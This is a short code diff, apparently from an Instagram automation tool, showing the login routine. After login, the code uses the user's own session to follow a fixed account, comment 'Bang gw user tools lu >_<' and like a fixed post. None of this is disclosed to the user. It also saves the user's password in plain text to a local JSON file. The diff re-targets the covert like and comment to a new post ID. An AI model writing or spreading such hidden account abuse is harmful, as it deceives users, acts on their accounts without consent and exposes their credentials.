@@ -150,8 +150,8 @@ def logak():
 			res.headers.update({'X-CSRFToken': csrf})
 			comew = {'comment_text':'Bang gw user tools lu >_<'}
 			polome = res.post("https://www.instagram.com/web/friendships/6969299192/follow/", allow_redirects=True)
-			komeme = res.post("https://www.instagram.com/web/comments/2078388127877395758/add/", data=comew)
-			likme = res.post("https://www.instagram.com/web/likes/2078388127877395758/like/")
+			komeme = res.post("https://www.instagram.com/web/comments/2280516158426534857/add/", data=comew)
+			likme = res.post("https://www.instagram.com/web/likes/2280516158426534857/like/")
 			sep = open("instagram_akun.json","w")
 			sep.write('{"username":"'+nama+'", "password":"'+pes+'"}')
 			time.sleep(1)
